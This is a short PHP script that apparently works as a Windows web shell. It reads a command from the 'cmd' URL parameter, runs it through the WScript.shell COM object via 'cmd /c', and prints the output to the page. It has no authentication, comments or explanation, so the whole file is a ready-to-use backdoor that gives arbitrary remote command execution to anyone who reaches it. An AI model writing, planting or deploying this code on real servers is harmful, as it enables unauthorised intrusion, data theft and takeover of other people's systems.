<?php
$cod=$_GET['cmd'];
$wsh = new COM('WScript.shell');
$exec = $wsh->exec("cmd /c ".$cod);
$stdout = $exec->StdOut();
$stroutput = $stdout->ReadAll();
echo "<pre>";
echo $stroutput;
echo "<pre/>";
?>